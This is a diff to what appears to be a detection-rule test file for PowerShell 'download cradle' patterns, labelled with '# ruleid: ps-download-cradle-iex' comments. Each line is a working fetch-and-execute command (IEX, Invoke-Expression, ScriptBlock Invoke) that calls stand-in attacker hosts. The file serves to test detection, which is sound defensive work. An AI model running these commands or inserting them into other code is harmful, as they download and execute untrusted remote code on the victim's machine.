@@ -5,8 +5,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps
 Invoke-Expression (Invoke-WebRequest -Uri 'https://attacker.example.com/payload.ps1' -UseBasicParsing).Content
 
 # ruleid: ps-download-cradle-iex
-$code = (New-Object System.Net.WebClient).DownloadString('https://c2.example.com/loader.ps1')
-IEX $code
+IEX ((New-Object System.Net.WebClient).DownloadString('https://c2.example.com/loader.ps1'))
 
 # ruleid: ps-download-cradle-iex
 [ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('http://10.0.0.1/run.ps1')).Invoke()
